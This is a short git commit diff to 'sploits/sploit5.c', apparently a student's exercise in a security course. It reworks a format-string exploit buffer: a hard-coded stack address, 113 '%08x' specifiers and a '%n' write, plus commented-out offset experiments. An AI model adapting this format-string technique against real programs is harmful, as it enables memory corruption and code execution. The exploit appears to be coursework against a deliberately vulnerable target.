b2395572c06c4253185cf736389cd5fb55f70cb7
evilfrog262 <kcox3@wisc.edu>
2014-02-17 22:13:59 -0800

    tuff

--- sploits/sploit5.c
+++ sploits/sploit5.c
@@ -8,12 +8,19 @@
 
 int main(void)
 {
+  int i;
   char *args[3];
   char *env[1];
-  char buf[31];
-  memset(buf, 0x90, 31);
+  char buf[307];
+  memset(buf, 0x90, 307);
 
-  strncpy(buf, "\x30\xfb\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n", 31);
+  strncpy(buf, "\x30\xfb\xff\xbf", 4);
+  for(i = 0; i < 113; i++) {
+    strncpy(buf+4+(i*4), "%08x", 4); 
+  }
+  
+  strncpy(buf+305, "%n", 2);
+  //printf(buf);
   //strncpy(buf+240, "\x70", 1);
   //strncpy(buf+236, "\x08\xfd\xff\xbf", 4);
   //strncpy(buf+244, "\x12\x34\x56\x78", 4);
